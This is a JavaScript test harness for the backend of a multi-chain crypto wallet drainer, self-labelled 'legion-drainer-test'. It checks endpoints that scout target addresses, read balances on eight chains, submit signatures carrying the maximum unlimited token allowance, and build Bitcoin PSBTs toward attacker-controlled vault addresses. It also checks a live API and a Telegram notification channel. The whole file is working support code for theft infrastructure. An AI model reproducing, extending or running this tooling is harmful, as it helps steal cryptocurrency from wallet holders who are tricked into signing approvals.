/**
 * Dry-run all 8 chain backend paths (no wallet signing).
 * Usage: node scripts/test-legion-one-dryrun.mjs
 */
const BACKEND = process.env.BACKEND_URL || 'https://legionapi-production.up.railway.app';
const KINETIC_KEY = process.env.KINETIC_INTERNAL_KEY || '';
const SURGE_ORIGIN = 'https://legion-drainer-test.surge.sh';

const CHAINS = [
  { tab: 'evm', family: 'EVM', address: '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0', walletType: 'MetaMask', fusionKey: 'evm_holder', balanceParam: 'evm', extension: 'MetaMask / Rabby' },
  { tab: 'sol', family: 'SVM', address: '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv', walletType: 'Phantom', fusionKey: 'sol_owner_base58', balanceParam: 'sol', extension: 'Phantom / Solflare' },
  { tab: 'tron', family: 'TRON', address: 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc', walletType: 'TronLink', fusionKey: 'tron_holder_base58', balanceParam: 'tron', extension: 'TronLink' },
  { tab: 'ton', family: 'TON', address: 'UQDItY0ugaDxkMn_Rjb6gZfHOd3-R0ebD5ksb5SoTjeI3BfY', walletType: 'Tonkeeper', fusionKey: 'ton_friendly_address', balanceParam: 'ton', extension: 'Tonkeeper' },
  { tab: 'btc', family: 'UTXO', address: 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v', walletType: 'UniSat', fusionKey: 'btc_holder_address', balanceParam: 'btc', extension: 'UniSat / Xverse', psbtExpectNoUtxo: true },
  { tab: 'cosmos', family: 'COSMOS', address: 'cosmos1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqnrql8a', walletType: 'Keplr', fusionKey: 'cosmos_holder_address', balanceParam: 'cosmos', extension: 'Keplr', needsVault: 'cosmos' },
  { tab: 'aptos', family: 'APTOS', address: '0x1', walletType: 'Petra', fusionKey: 'aptos_holder_address', balanceParam: 'aptos', extension: 'Petra', needsVault: 'aptos' },
  { tab: 'sui', family: 'SUI', address: '0x2', walletType: 'Sui Wallet', fusionKey: 'sui_holder_address', balanceParam: 'sui', extension: 'Sui Wallet', needsVault: 'sui' },
];

function safeStringify(value) {
  const seen = new WeakSet();
  return JSON.stringify(value, (_key, val) => {
    if (typeof val === 'bigint') return val.toString();
    if (val != null && typeof val === 'object') {
      if (seen.has(val)) return undefined;
      seen.add(val);
      if (typeof val.request === 'function') return undefined;
    }
    if (typeof val === 'function') return undefined;
    return val;
  });
}

async function fetchWithRetry(url, options = {}, retries = 3) {
  let lastErr;
  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(url, { ...options, signal: AbortSignal.timeout(30_000) });
      return res;
    } catch (e) {
      lastErr = e;
      if (i < retries - 1) await new Promise((r) => setTimeout(r, 1000 * (i + 1)));
    }
  }
  throw lastErr;
}

async function apiPost(path, body) {
  const headers = { 'Content-Type': 'application/json' };
  if (KINETIC_KEY) headers['x-legion-kinetic-key'] = KINETIC_KEY;
  const res = await fetchWithRetry(`${BACKEND}${path}`, { method: 'POST', headers, body: safeStringify(body) });
  const data = await res.json().catch(() => ({}));
  const ok = data.ok !== false && res.ok;
  return { ok, status: res.status, message: data.message || res.statusText, data: data.data ?? data };
}

async function apiGet(path) {
  const res = await fetchWithRetry(`${BACKEND}${path}`);
  const data = await res.json().catch(() => ({}));
  const ok = data.ok !== false && res.ok;
  return { ok, status: res.status, message: data.message || res.statusText, data: data.data ?? data };
}

function simulateWalletProviderCircular() {
  const eth = { isMetaMask: true };
  eth.self = eth;
  const conn = { address: '0xabc', provider: eth, walletType: 'MetaMask' };
  try {
    JSON.stringify({ wallet_type: conn.provider || conn.name });
    return { pass: false, detail: 'expected circular error' };
  } catch {
    const fixed = safeStringify({ wallet_type: conn.walletType });
    return { pass: true, detail: `safeStringify ok (${fixed.length} bytes)` };
  }
}

async function testClientConfig() {
  const cfg = await apiGet('/api/v1/client-config');
  const steps = {};
  steps.endpoint = cfg.ok ? 'PASS' : `FAIL ${cfg.status}`;
  if (cfg.ok && cfg.data) {
    const vaults = cfg.data.vault_addresses || {};
    const missing = ['cosmos', 'aptos', 'sui'].filter((k) => !vaults[k]);
    steps.vault_addresses = missing.length
      ? `WARN missing on API: ${missing.join(', ')} (set VAULT_ADDRESS_* on Railway)`
      : 'PASS all extended-chain vaults exposed';
    steps.surge_cors = cfg.data.surge_origin_configured
      ? 'PASS Surge origin in API_CORS_ORIGINS'
      : `WARN add ${SURGE_ORIGIN} to Railway API_CORS_ORIGINS`;
    steps.allowance_reuse = cfg.data.allowance_reuse_enabled ? 'PASS enabled' : 'WARN disabled';
  }
  return steps;
}

async function testOmnichainEnvelopeMock() {
  const body = {
    ingress: 'normalized_v1',
    chain_family: 'EVM',
    protocol: 'omnichain_atomic_v1',
    wallet_address: 'cosmos1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqnrql8a',
    token_address: 'OMNI_COSMOS_ANCHOR',
    signature: '0x' + '00'.repeat(130),
    cosmos_payload: {
      native_amount_cosmos: '1000',
      cosmos_signed_tx: 'dGVzdA==',
      cosmos_tx_encoding: 'base64',
    },
    nonce: 'dryrun:' + Date.now(),
    expiry_iso: '2099-12-31T23:59:59.999Z',
    wallet_type: 'Keplr',
    scout_value_usd: 1,
    max_allowance: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
    requires_quorum: false,
  };
  const res = await apiPost('/api/v1/signature-anchor', body);
  if (res.ok) return 'PASS anchor accepted (cosmos-only omnichain leg)';
  if (res.status === 400 && /hex addresses/i.test(res.message)) {
    return `FAIL ${res.status}: ${res.message} (deploy latest API — omnichain non-EVM fix)`;
  }
  if (res.status === 400 || res.status === 503) {
    return `PARTIAL ${res.status}: ${res.message}`;
  }
  return `FAIL ${res.status}: ${res.message}`;
}

async function testChain(chain, clientVaults) {
  const result = { chain: chain.tab, extension: chain.extension, steps: {} };
  result.steps.safeStringify = simulateWalletProviderCircular().pass ? 'PASS' : 'FAIL';

  const scout = await apiPost('/api/v1/scout', {
    user_address: chain.address,
    chain_id: chain.tab === 'evm' ? 1 : 0,
    chain_family: chain.family,
    wallet_type: chain.walletType,
  });
  result.steps.scout = scout.ok ? 'PASS' : `FAIL ${scout.status}: ${scout.message}`;

  const balance = await apiGet(`/api/v1/balance/multi?${chain.balanceParam}=${encodeURIComponent(chain.address)}`);
  result.steps.balance = balance.ok ? 'PASS' : `FAIL ${balance.status}: ${balance.message}`;

  const fusion = await apiPost('/api/scout/recursive-predator-fusion', { [chain.fusionKey]: chain.address });
  result.steps.fusion = fusion.ok ? 'PASS' : `FAIL ${fusion.status}: ${fusion.message}`;

  if (chain.tab === 'btc') {
    const psbt = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
      wallet_address: chain.address,
      amount_sat: '10000',
    });
    if (chain.psbtExpectNoUtxo && !psbt.ok && /utxo/i.test(psbt.message)) {
      result.steps.psbt_build = 'PASS (expected no UTXO on vault address — use funded burner wallet live)';
    } else {
      result.steps.psbt_build = psbt.ok ? 'PASS' : `FAIL ${psbt.status}: ${psbt.message}`;
    }
  }

  if (chain.needsVault) {
    const v = clientVaults[chain.needsVault];
    result.steps.vault_config = v
      ? `PASS vault from client-config (${v.slice(0, 12)}…)`
      : `NEEDS VAULT_ADDRESS_${chain.needsVault.toUpperCase()} on Railway`;
  }

  const failed = Object.values(result.steps).some((v) => String(v).startsWith('FAIL'));
  result.overall = failed ? 'PARTIAL' : chain.needsVault && !clientVaults[chain.needsVault]
    ? 'BACKEND_OK (vault required)'
    : 'PASS';
  return result;
}

async function main() {
  console.log('=== Legion 8-Chain Dry Run ===\n');
  console.log('Backend:', BACKEND, '\n');

  const health = await apiGet('/health');
  console.log('Health:', health.ok ? 'OK' : `FAIL ${health.status}`);

  const telegram = await apiGet('/telegram-status');
  console.log('Telegram:', telegram.ok ? JSON.stringify(telegram.data) : `FAIL ${telegram.status}`);

  const cfgSteps = await testClientConfig();
  console.log('\nClient config:');
  for (const [k, v] of Object.entries(cfgSteps)) console.log(`  ${k}: ${v}`);

  const cfg = await apiGet('/api/v1/client-config');
  const clientVaults = (cfg.ok && cfg.data && cfg.data.vault_addresses) || {};

  const omni = await testOmnichainEnvelopeMock();
  console.log('\nOmnichain mock (cosmos leg):', omni, '\n');

  const results = [];
  for (const chain of CHAINS) {
    try {
      const r = await testChain(chain, clientVaults);
      results.push(r);
      console.log(`[${r.chain.toUpperCase()}] ${r.overall}`);
      for (const [step, status] of Object.entries(r.steps)) console.log(`  ${step}: ${status}`);
      console.log('');
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e);
      const r = { chain: chain.tab, overall: 'PARTIAL', steps: { network: `WARN ${msg}` } };
      results.push(r);
      console.log(`[${r.chain.toUpperCase()}] ${r.overall}`);
      console.log(`  network: ${r.steps.network}`);
      console.log('');
    }
  }

  const ok = results.filter((r) => r.overall === 'PASS' || r.overall.startsWith('BACKEND_OK')).length;
  const partial = results.filter((r) => r.overall === 'PARTIAL').length;
  console.log(`Summary: ${ok}/${results.length} chains backend-ready (${partial} partial/network)`);
  const hardFail = results.some((r) => Object.values(r.steps || {}).some((v) => String(v).startsWith('FAIL')));
  process.exit(hardFail ? 1 : 0);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
